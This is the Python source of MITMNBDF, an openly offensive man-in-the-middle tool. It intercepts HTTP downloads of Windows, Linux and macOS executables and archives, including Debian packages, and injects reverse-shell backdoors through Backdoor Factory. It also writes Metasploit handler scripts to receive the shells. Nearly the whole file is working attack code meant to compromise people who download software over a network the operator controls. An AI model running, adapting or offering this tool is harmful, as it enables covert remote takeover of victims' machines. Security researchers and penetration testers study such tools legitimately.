#!/usr/bin/env python
"""
    MITMNBDF v1.0
    Author Davide Barbato
    Copyright (c) 2015, Davide Barbato
    All rights reserved.
    Redistribution and use in source and binary forms, with or without modification,
    are permitted provided that the following conditions are met:
        1. Redistributions of source code must retain the above copyright notice,
        this list of conditions and the following disclaimer.
        2. Redistributions in binary form must reproduce the above copyright notice,
        this list of conditions and the following disclaimer in the documentation
        and/or other materials provided with the distribution.
        3. Neither the name of the copyright holder nor the names of its contributors
        may be used to endorse or promote products derived from this software without
        specific prior written permission.
    THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
    AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
    IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
    ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
    LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
    CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
    SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
    INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
    CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
    ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
    POSSIBILITY OF SUCH DAMAGE.

    Tested on Ubuntu 14.04
"""

from libmproxy import controller, proxy, platform
from libmproxy.proxy.server import ProxyServer
import os
from bdf import pebin
from bdf import elfbin
from bdf import machobin
import shutil
import sys
import pefile
import logging
import tempfile
import libarchive
import magic
from contextlib import contextmanager
from configobj import ConfigObj
from multiprocessing import Process, Queue


@contextmanager
def in_dir(dirpath):
    prev = os.path.abspath(os.getcwd())
    os.chdir(dirpath)
    try:
        yield
    finally:
        os.chdir(prev)


class EnhancedOutput:
    def __init__(self):
        pass

    @staticmethod
    def print_error(txt):
        print "[x] {}".format(txt)

    @staticmethod
    def print_info(txt):
        print "[*] {}".format(txt)

    @staticmethod
    def print_warning(txt):
        print "[!] {}".format(txt)

    @staticmethod
    def logging_error(txt):
        logging.error("ERRO|{}".format(txt))

    @staticmethod
    def logging_warning(txt):
        logging.warning("WARN|{}".format(txt))

    @staticmethod
    def logging_info(txt):
        logging.info("INFO|{}".format(txt))

    @staticmethod
    def logging_debug(txt):
        logging.debug("DEBG|{}".format(txt))

    @staticmethod
    def logging_critical(txt):
        logging.debug("CRIT|{}".format(txt))

    @staticmethod
    def print_size(f):
        # assuming f in bytes
        size = len(f) / 1024
        EnhancedOutput.print_info("File size: {} KB".format(size))


# handles the archive types.
# ar_type must be present in the config file both in 'supportedArchiveTypes' and as a standalone section.
# refer to the README.md for further information
class ArchiveType:
    blacklist = []
    maxSize = 0
    patchCount = 0
    name = None

    # ConfigObj will throw an exception if something is missing
    def __init__(self, ar_type):
        cfg = ConfigObj(CONFIGFILE)
        self.blacklist = cfg[ar_type]['blacklist']
        self.maxSize = cfg[ar_type].as_int('maxSize')
        self.patchCount = cfg[ar_type].as_int('patchCount')
        self.name = ar_type


class MITMnBDFInjector:
    userConfig = None
    host_blacklist = []
    host_whitelist = []
    keys_blacklist = []
    keys_whitelist = []
    patchIT = False
    archive_types = []
    binary_types = []
    backdoor_compressed_files = False
    linux_type = None
    windows_type = None
    fat_priority = None
    file_size_max = 0
    # this is hardcoded in bdf/pebin.py
    # hopefully some day it will be taken out...
    staging_folder = "backdoored"

    # holds the HOST HTTP field
    host_domain = None

    linux_binary = {'x86': {}, 'x64': {}}
    windows_binary = {'x86': {}, 'x64': {}}
    macho_binary = {'x86': {}, 'x64': {}}

    # different types of binary.
    # add here if you need more type and don't forget to create the appropriate section the config file
    oplist = ['LinuxIntelx86', 'LinuxIntelx64', 'WindowsIntelx86', 'WindowsIntelx64', 'MachoIntelx86', 'MachoIntelx64']

    flow = None

    def __init__(self, flow):
        self.flow = flow

        try:
            self.set_config()
            # do the injection here!
            self.handle()
        except Exception as exc:
            EnhancedOutput.print_error(exc)
            EnhancedOutput.logging_debug("Config file failed: {}".format(exc))

        resp_q.put(self.flow)

    def set_config(self):
        self.userConfig = ConfigObj(CONFIGFILE)
        self.host_blacklist = self.userConfig['hosts']['blacklist']
        self.host_whitelist = self.userConfig['hosts']['whitelist']
        self.keys_blacklist = self.userConfig['keywords']['blacklist']
        self.keys_whitelist = self.userConfig['keywords']['whitelist']
        self.archive_types = self.userConfig['Overall']['supportedArchiveTypes']
        self.binary_types = self.userConfig['Overall']['supportedBinaryTypes']
        # let's configure the backdoor params for each type of binary
        self.update_binaries('ALL')
        # write the msf resource file
        self.write_resource_script(self.userConfig['Overall']['resourceScriptFile'])

    def write_resource_script(self, resource_script):
        with open(resource_script, 'w') as f:
            for bins in [self.linux_binary, self.windows_binary, self.macho_binary]:
                # we are not really interested in the architecture...
                for arch, val in bins.items():
                    strz = "use exploit/multi/handler\n"
                    strz += 'set PAYLOAD ' + val['MSFPAYLOAD'] + "\n"
                    strz += 'set LHOST ' + val['HOST'] + "\n"
                    strz += 'set LPORT ' + str(val['PORT']) + "\n"
                    strz += "set ExitOnSession false\n\n"
                    strz += "exploit -j -z\n\n"
                    f.write(strz)

    def update_binaries(self, target):
        for op in self.oplist:
            if op not in self.userConfig['targets'][target]:
                continue

            if 'x86' in op:
                if 'Linux' in op:
                    self.linux_binary['x86'].update(self.userConfig['targets'][target][op])
                elif 'Windows' in op:
                    self.windows_binary['x86'].update(self.userConfig['targets'][target][op])
                elif 'Macho' in op:
                    self.macho_binary['x86'].update(self.userConfig['targets'][target][op])
            elif 'x64' in op:
                if 'Linux' in op:
                    self.linux_binary['x64'].update(self.userConfig['targets'][target][op])
                elif 'Windows' in op:
                    self.windows_binary['x64'].update(self.userConfig['targets'][target][op])
                elif 'Macho' in op:
                    self.macho_binary['x64'].update(self.userConfig['targets'][target][op])

    def as_bool(self, val):
        return val.lower() in "true"

    # arch_info example: {'type':'TAR', 'format':'gnutar', 'filter':'bzip2'}
    def archive_files(self, arch_file_bytes, arch_info, include_dirs=False):
        try:
            archive_type = ArchiveType(arch_info['type'])
        except Exception as ex:
            EnhancedOutput.print_error("Missing fields in the config file: {}".format(ex))
            EnhancedOutput.print_warning("Returning original file.")
            EnhancedOutput.logging_error("Error setting archive type: {}. Returning original file.".format(ex))
            return arch_file_bytes

        EnhancedOutput.print_size(arch_file_bytes)

        if len(arch_file_bytes) > archive_type.maxSize:
            EnhancedOutput.print_error("{} over allowed size".format(arch_info['type']))
            EnhancedOutput.logging_info("{} maxSize met {}".format(arch_info['type'], len(arch_file_bytes)))
            return arch_file_bytes

        tmp_dir = tempfile.mkdtemp()

        try:
            with in_dir(tmp_dir):
                flags = libarchive.extract.EXTRACT_OWNER | libarchive.extract.EXTRACT_PERM | libarchive.extract.EXTRACT_TIME
                libarchive.extract_memory(arch_file_bytes, flags)
        except Exception as exce:
            EnhancedOutput.print_error("Can't extract file. Returning original one.")
            EnhancedOutput.logging_error("Can't extract file: {}. Returning original one.".format(exce))
            return arch_file_bytes

        EnhancedOutput.print_info("{} file contents and info".format(arch_info['type']))
        EnhancedOutput.print_info("Compression: {}".format(arch_info['filter']))

        files_list = list()
        for dirname, dirnames, filenames in os.walk(tmp_dir):
            dirz = dirname.replace(tmp_dir, ".")
            print "\t{0}".format(dirz)
            if include_dirs:
                files_list.append(dirz)
            for f in filenames:
                fn = os.path.join(dirz, f)
                files_list.append(fn)
                print "\t{} {}".format(fn, os.lstat(os.path.join(dirname, f)).st_size)

        patch_count = 0
        patched = False
        tmp_archive = tempfile.NamedTemporaryFile()

        try:
            with libarchive.file_writer(tmp_archive.name, arch_info['format'], arch_info['filter']) as archive:
                for filename in files_list:
                    full_path = os.path.join(tmp_dir, filename)
                    EnhancedOutput.print_info(">>> Next file in archive: {}".format(filename))

                    if os.path.islink(full_path) or not os.path.isfile(full_path):
                        EnhancedOutput.print_warning("{} is not a file, skipping.".format(filename))
                        with in_dir(tmp_dir):
                            archive.add_files(filename)
                        continue

                    if os.lstat(full_path).st_size >= long(self.file_size_max):
                        EnhancedOutput.print_warning("{} is too big, skipping.".format(filename))
                        with in_dir(tmp_dir):
                            archive.add_files(filename)
                        continue

                    # Check against keywords
                    keyword_check = False

                    if type(archive_type.blacklist) is str:
                        if archive_type.blacklist.lower() in filename.lower():
                            keyword_check = True
                    else:
                        for keyword in archive_type.blacklist:
                            if keyword.lower() in filename.lower():
                                keyword_check = True
                                continue

                    if keyword_check is True:
                        EnhancedOutput.print_warning("Archive blacklist enforced!")
                        EnhancedOutput.logging_info("Archive blacklist enforced on {}".format(filename))
                        continue

                    if patch_count >= archive_type.patchCount:
                        with in_dir(tmp_dir):
                            archive.add_files(filename)
                        EnhancedOutput.logging_info("Met archive config patch count limit. Adding original file.")
                    else:
                        # create the file on disk temporarily for binaryGrinder to run on it
                        tmp = tempfile.NamedTemporaryFile()
                        shutil.copyfile(full_path, tmp.name)
                        tmp.flush()
                        patch_result = self.binary_injector(tmp.name)
                        if patch_result:
                            patch_count += 1
                            file2 = os.path.join(self.staging_folder, os.path.basename(tmp.name))
                            EnhancedOutput.print_info("Patching complete, adding to archive file.")
                            # let's move the backdoored file to the final location
                            shutil.copyfile(file2, full_path)
                            EnhancedOutput.logging_info(
                                "{} in archive patched, adding to final archive".format(filename))
                            os.remove(file2)
                            patched = True
                        else:
                            EnhancedOutput.print_error("Patching failed")
                            EnhancedOutput.logging_error("{} patching failed. Keeping original file.".format(filename))

                        with in_dir(tmp_dir):
                            archive.add_files(filename)
                        tmp.close()

        except Exception as exc:
            EnhancedOutput.print_error(
                "Error while creating the archive: {}. Returning the original file.".format(exc))
            EnhancedOutput.logging_error("Error while creating the archive: {}. Returning original file.".format(exc))
            shutil.rmtree(tmp_dir, ignore_errors=True)
            tmp_archive.close()
            return arch_file_bytes

        if patched is False:
            EnhancedOutput.print_info("No files were patched. Forwarding original file")
            shutil.rmtree(tmp_dir, ignore_errors=True)
            tmp_archive.close()
            return arch_file_bytes

        with open(tmp_archive.name, 'r+b') as f:
            ret = f.read()

        # cleanup
        shutil.rmtree(tmp_dir, ignore_errors=True)
        tmp_archive.close()

        EnhancedOutput.logging_info(
            "Patching complete for HOST: {} ({}), PATH: {}".format(self.flow.request.host, self.host_domain,
                                                                   self.flow.request.path))
        return ret

    def deb_files(self, deb_file):
        try:
            archive_type = ArchiveType('AR')
        except Exception as e:
            EnhancedOutput.print_error("Missing fields in the config file: {}".format(e))
            EnhancedOutput.print_warning("Returning original file")
            EnhancedOutput.logging_error("Error setting archive type: {}. Returning original file.".format(e))
            return deb_file

        EnhancedOutput.print_size(deb_file)

        if len(deb_file) > archive_type.maxSize:
            EnhancedOutput.print_error("AR File over allowed size")
            EnhancedOutput.logging_info("AR File maxSize met {}".format(len(deb_file)))
            return deb_file

        tmp_dir = tempfile.mkdtemp()

        # first: save the stream to a local file
        tmp_file = tempfile.NamedTemporaryFile()
        tmp_file.write(deb_file)
        tmp_file.seek(0)

        # chdir to the tmp_dir which the new ar file resides
        # and extract it so work on the 'copy' of the stream
        with in_dir(tmp_dir):
            libarchive.extract_file(tmp_file.name)

        file2inject = 'data.tar.gz'
        infoz = {'type': 'TAR', 'format': 'ustar', 'filter': 'gzip'}

        if os.path.exists(os.path.join(tmp_dir, 'data.tar.xz')):
            file2inject = 'data.tar.xz'
            infoz = {'type': 'LZMA', 'format': 'gnutar', 'filter': 'xz'}

        EnhancedOutput.print_info("Patching {0}".format(file2inject))
        # recreate the injected archive
        with open(os.path.join(tmp_dir, file2inject), 'r+b') as f:
            bfz = f.read()
            f.seek(0)
            f.write(self.archive_files(bfz, infoz, include_dirs=True))
            f.flush()

        blk = []

        def write_data(data):
            blk.append(data[:])
            return len(data[:])

        with libarchive.custom_writer(write_data, 'ar_bsd') as archive:
            archive.add_files(os.path.join(tmp_dir, 'debian-binary'))
            archive.add_files(os.path.join(tmp_dir, 'control.tar.gz'))
            archive.add_files(os.path.join(tmp_dir, file2inject))

        buf = b''.join(blk)

        # clean up
        shutil.rmtree(tmp_dir, ignore_errors=True)
        tmp_file.close()

        return buf

    def binary_injector(self, binary_file):
        # Feed potential binaries into this function,
        # it will return the result Patched, False, or None
        with open(binary_file, 'r+b') as f:
            binary_handle = f.read()

        binary_header = binary_handle[:4]
        result = None

        try:
            if binary_header[:2] == 'MZ':  # PE/COFF
                pe = pefile.PE(data=binary_handle, fast_load=True)
                magic = pe.OPTIONAL_HEADER.Magic
                machine_type = pe.FILE_HEADER.Machine

                add_section = False
                cave_jumping = False
                windows_binary = None

                # update when supporting more than one arch
                if magic == int('20B', 16) and machine_type == 0x8664 and self.windows_type.lower() in ['all', 'x64']:
                    windows_binary = self.windows_binary['x64']

                    if windows_binary['PATCH_TYPE'].lower() == 'append':
                        add_section = True
                    elif windows_binary['PATCH_TYPE'].lower() == 'jump':
                        cave_jumping = True

                    # if 'automatic', override
                    if windows_binary['PATCH_TYPE'].lower() == 'automatic':
                        cave_jumping = True

                elif machine_type == 0x14c and self.windows_type.lower() in ['all', 'x86']:
                    windows_binary = self.windows_binary['x86']

                    if windows_binary['PATCH_TYPE'].lower() == 'append':
                        add_section = True
                    elif windows_binary['PATCH_TYPE'].lower() == 'jump':
                        cave_jumping = True

                    # if automatic override
                    if windows_binary['PATCH_TYPE'].lower() == 'automatic':
                        cave_jumping = True
                        add_section = False

                else:
                    return None

                target_file = pebin.pebin(FILE=binary_file,
                                          OUTPUT=os.path.basename(binary_file),
                                          SHELL=windows_binary['SHELL'],
                                          HOST=windows_binary['HOST'],
                                          PORT=int(windows_binary['PORT']),
                                          ADD_SECTION=add_section,
                                          CAVE_JUMPING=cave_jumping,
                                          IMAGE_TYPE=self.windows_type,
                                          RUNAS_ADMIN=self.as_bool(windows_binary['RUNAS_ADMIN']),
                                          PATCH_DLL=self.as_bool(windows_binary['PATCH_DLL']),
                                          SUPPLIED_SHELLCODE=windows_binary['SUPPLIED_SHELLCODE'],
                                          ZERO_CERT=self.as_bool(windows_binary['ZERO_CERT']),
                                          PATCH_METHOD=windows_binary['PATCH_METHOD'].lower(),
                                          SUPPLIED_BINARY=windows_binary['SUPPLIED_BINARY'],
                                          XP_MODE=self.as_bool(windows_binary['XP_MODE'])
                                          )

                result = target_file.run_this()

            elif binary_header[:4].encode('hex') == '7f454c46':  # ELF
                target_file = elfbin.elfbin(FILE=binary_file, SUPPORT_CHECK=False)
                target_file.support_check()

                linux_binary = None

                if target_file.class_type == 0x1:
                    linux_binary = self.linux_binary['x86']
                elif target_file.class_type == 0x2:
                    linux_binary = self.linux_binary['x64']
                else:
                    return None

                target_file = elfbin.elfbin(FILE=binary_file,
                                            OUTPUT=os.path.basename(binary_file),
                                            SHELL=linux_binary['SHELL'],
                                            HOST=linux_binary['HOST'],
                                            PORT=int(linux_binary['PORT']),
                                            SUPPLIED_SHELLCODE=linux_binary['SUPPLIED_SHELLCODE'],
                                            IMAGE_TYPE=self.linux_type
                                            )
                result = target_file.run_this()

            elif binary_header[:4].encode('hex') in ['cefaedfe', 'cffaedfe', 'cafebabe']:  # Macho
                target_file = machobin.machobin(FILE=binary_file, SUPPORT_CHECK=False)
                target_file.support_check()

                macho_binary = None

                # ONE CHIP SET MUST HAVE PRIORITY in FAT FILE
                if target_file.FAT_FILE is True:
                    if self.fat_priority == 'x86':
                        macho_binary = self.macho_binary['x86']
                    elif self.fat_priority == 'x64':
                        macho_binary = self.macho_binary['x64']
                    else:
                        return None
                elif target_file.mach_hdrs[0]['CPU Type'] == '0x7':
                    macho_binary = self.macho_binary['x86']
                elif target_file.mach_hdrs[0]['CPU Type'] == '0x1000007':
                    macho_binary = self.macho_binary['x64']
                else:
                    return None

                target_file = machobin.machobin(FILE=binary_file,
                                                OUTPUT=os.path.basename(binary_file),
                                                SHELL=macho_binary['SHELL'],
                                                HOST=macho_binary['HOST'],
                                                PORT=int(macho_binary['PORT']),
                                                SUPPLIED_SHELLCODE=macho_binary['SUPPLIED_SHELLCODE'],
                                                FAT_PRIORITY=self.fat_priority
                                                )
                result = target_file.run_this()

            return result

        except Exception as e:
            EnhancedOutput.print_error('binary_injector: {}'.format(e))
            EnhancedOutput.logging_warning("Exception in binary_injector: {}".format(e))
            return None

    def hosts_whitelist_check(self, flow):
        # if we have 'ALL' or a single IP/domain, then it's a str
        if type(self.host_whitelist) is str:
            if self.host_whitelist.lower() == 'all':
                self.patchIT = True
            # str(self.host_domain) helps us in case of host domain is None
            elif self.host_whitelist.lower() in flow.request.host.lower() or self.host_whitelist.lower() in str(
                    self.host_domain):
                self.patchIT = True
                EnhancedOutput.logging_info(
                    "Host whitelist hit: {}, HOST: {} ({})".format(self.host_whitelist, flow.request.host,
                                                                   self.host_domain))
        # if hosts are comma separated, then we have a list
        else:
            for keyword in self.host_whitelist:
                if keyword.lower() in flow.request.host.lower():
                    self.patchIT = True
                    EnhancedOutput.logging_info(
                        "Host whitelist hit: {}, HOST: {} ({})".format(self.host_whitelist, flow.request.host,
                                                                       self.host_domain))
                    break

    def keys_whitelist_check(self, flow):
        # Host whitelist check takes precedence
        if self.patchIT is False:
            return None

        if type(self.keys_whitelist) is str:
            if self.keys_whitelist.lower() == 'all':
                self.patchIT = True
            elif self.keys_whitelist.lower() in flow.request.path.lower():
                self.patchIT = True
                EnhancedOutput.logging_info(
                    "Keyword whitelist hit: {}, PATH: {}".format(self.keys_whitelist, flow.request.path))
        else:
            for keyword in self.keys_whitelist:
                if keyword.lower() in flow.requeset.path.lower():
                    self.patchIT = True
                    EnhancedOutput.logging_info(
                        "Keyword whitelist hit: {}, PATH: {}".format(keyword, flow.request.path))
                    break

    def keys_backlist_check(self, flow):
        if type(self.keys_blacklist) is str:
            if self.keys_blacklist.lower() in flow.request.path.lower():
                self.patchIT = False
                EnhancedOutput.logging_info(
                    "Keyword blacklist hit: {}, PATH: {}".format(self.keys_blacklist, flow.request.path))
        else:
            for keyword in self.keys_blacklist:
                if keyword.lower() in flow.request.path.lower():
                    self.patchIT = False
                    EnhancedOutput.logging_info(
                        "Keyword blacklist hit: {}, PATH: {}".format(keyword, flow.request.path))
                    break

    def hosts_blacklist_check(self, flow):
        if type(self.host_blacklist) is str:
            if self.host_blacklist.lower() in flow.request.host.lower() or self.host_blacklist.lower() in str(
                    self.host_domain):
                self.patchIT = False
                EnhancedOutput.logging_info(
                    "Host Blacklist hit: {} : HOST: {} ({}) ".format(self.host_blacklist, flow.request.host,
                                                                     self.host_domain))
        else:
            for host in self.host_blacklist:
                if host.lower() in flow.request.host.lower():
                    self.patchIT = False
                    EnhancedOutput.logging_info(
                        "Host Blacklist hit: {} : HOST: {} ({})".format(host, flow.request.host, self.host_domain))
                    break

    def parse_target(self, target):
        for key, value in self.userConfig['targets'][target].items():
            if key == 'FileSizeMax':
                self.file_size_max = value
            elif key == 'LinuxType':
                self.linux_type = value
            elif key == 'WindowsType':
                self.windows_type = value
            elif key == 'FatPriority':
                self.fat_priority = value
            elif key == 'CompressedFiles':
                # little hack...woops
                self.backdoor_compressed_files = self.userConfig['targets'][target].as_bool('CompressedFiles')

    def handle(self):
        self.host_domain = self.flow.request.headers['Host'][0].lower() if 'Host' in self.flow.request.headers else None

        # Below are gates from whitelist --> blacklist
        # Blacklists have the final say, but everything starts off as not patchable
        # until a rule says True. Host whitelist overrides keyword whitelist.

        self.hosts_whitelist_check(self.flow)
        self.keys_whitelist_check(self.flow)

        self.keys_backlist_check(self.flow)
        self.hosts_blacklist_check(self.flow)

        if self.patchIT is False:
            EnhancedOutput.print_warning("Not patching, flow did not make it through config settings")
            EnhancedOutput.logging_info(
                "Config did not allow the patching of HOST: {} ({}), PATH: {}".format(self.flow.request.host,
                                                                                      self.host_domain,
                                                                                      self.flow.request.path))
        else:
            for target in self.userConfig['targets'].keys():
                if target == 'ALL':
                    # we don't need to call update_binaries() since it's already called in set_config() at startup
                    self.parse_target(target)
                elif target in self.flow.request.host or target in self.host_domain:
                    self.parse_target(target)
                    self.update_binaries(target)
                    # create the msf.rc per target
                    self.write_resource_script(target.replace('.', '_') + "_msf.rc")

            if len(self.flow.reply.obj.response.content) >= long(self.file_size_max):
                EnhancedOutput.print_warning("Not patching over content-length, forwarding to user")
                EnhancedOutput.logging_info(
                    "Not patching, over FileSizeMax setting {} ({}): {}".format(self.flow.request.host,
                                                                                self.host_domain,
                                                                                self.flow.request.path))
                return

            mime_type = magic.from_buffer(self.flow.reply.obj.response.content, mime=True)

            if mime_type in self.binary_types:
                tmp = tempfile.NamedTemporaryFile()
                tmp.write(self.flow.reply.obj.response.content)
                tmp.flush()
                tmp.seek(0)

                patch_result = self.binary_injector(tmp.name)
                if patch_result:
                    EnhancedOutput.print_info("Patching complete, forwarding to user.")
                    EnhancedOutput.logging_info(
                        "Patching complete for HOST: {} ({}), PATH: {}".format(self.flow.request.host, self.host_domain,
                                                                               self.flow.request.path))

                    bd_file = os.path.join(self.staging_folder, os.path.basename(tmp.name))
                    with open(bd_file, 'r+b') as file2:
                        self.flow = file2.read()

                    os.remove(bd_file)
                else:
                    EnhancedOutput.print_error("Patching failed")
                    EnhancedOutput.logging_info(
                        "Patching failed for HOST: {} ({}), PATH: {}".format(self.flow.request.host, self.host_domain,
                                                                             self.flow.request.path))

                tmp.close()
            else:
                for archive in self.archive_types:
                    if mime_type in self.userConfig[archive]['mimes'] and self.backdoor_compressed_files is True:
                        if archive == "DEB":
                            self.flow = self.deb_files(self.flow.reply.obj.response.content)
                        else:
                            params = {'type': archive, 'format': self.userConfig[archive][mime_type]['format'],
                                      'filter': (None if self.userConfig[archive][mime_type]['filter'] == "None" else
                                                 self.userConfig[archive][mime_type]['filter'])}
                            self.flow = self.archive_files(self.flow.reply.obj.response.content, params)


class MITMnBDF(controller.Master):
    def __init__(self, srv):
        controller.Master.__init__(self, srv)

    def run(self):
        try:
            return controller.Master.run(self)
        except KeyboardInterrupt:
            self.shutdown()

    def handle_request(self, flow):
        # I know, duplicate - can't think of a better way to do that, sorry
        host = flow.request.headers['Host'][0].lower() if 'Host' in flow.request.headers else None

        print "*" * 10, "REQUEST", "*" * 10
        EnhancedOutput.print_info("HOST: {} ({})".format(flow.request.host, host))
        EnhancedOutput.print_info("PATH: {}".format(flow.request.path))
        flow.reply()
        print "*" * 10, "END REQUEST", "*" * 10

    def handle_response(self, flow):
        host = flow.request.headers['Host'][0].lower() if 'Host' in flow.request.headers else None
        print "=" * 10, "RESPONSE", "=" * 10
        EnhancedOutput.print_info("HOST: {} ({})".format(flow.request.host, host))
        EnhancedOutput.print_info("PATH: {}".format(flow.request.path))

        # MITMnBDFInjector will put in the queue the resulting flow (modified or not)
        t = Process(target=MITMnBDFInjector, args=(flow,))
        t.start()

        flow.reply.obj.response.content = resp_q.get()
        flow.reply()
        print "=" * 10, "END RESPONSE", "=" * 10

# MAIN #
CONFIGFILE = "mitmnbdf.cfg"
resp_q = Queue()

# Ensure file and folder exist
if not os.path.exists(CONFIGFILE) or not os.path.isfile(CONFIGFILE):
    EnhancedOutput.print_error("Config file \'{}\' not found.".format(CONFIGFILE))
    sys.exit(1)

# Initial config file reading
user_cfg = ConfigObj(CONFIGFILE)
config = proxy.ProxyConfig(clientcerts=os.path.expanduser(user_cfg['Overall']['certLocation']),
                           body_size_limit=user_cfg['Overall'].as_int('MaxSizeFileRequested'),
                           port=user_cfg['Overall'].as_int('proxyPort'),
                           mode=user_cfg['Overall']['proxyMode'],
                           )

if user_cfg['Overall']['proxyMode'] != "None":
    config.proxy_mode = {'sslports': user_cfg['Overall']['sslports'],
                         'resolver': platform.resolver()
                         }

server = ProxyServer(config)

numericLogLevel = getattr(logging, user_cfg['Overall']['loglevel'].upper(), None)
if numericLogLevel is None:
    EnhancedOutput.print_error("INFO, DEBUG, WARNING, ERROR, CRITICAL for loglevel in conifg")
    sys.exit(1)

logging.basicConfig(filename=user_cfg['Overall']['logname'],
                    level=numericLogLevel,
                    format='%(asctime)s|%(message)s'
                    )

EnhancedOutput.print_warning("Configuring network forwarding.")
try:
    if sys.platform == "darwin":
        os.system("sysctl -w net.inet.ip.forwarding=1")
    elif sys.platform.startswith("linux"):
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
except Exception as e:
    EnhancedOutput.print_error(e)
    sys.exit(1)

m = MITMnBDF(server)

EnhancedOutput.print_info("Starting MITMNBDF")
EnhancedOutput.logging_info("Starting MITMNBDF")
m.run()
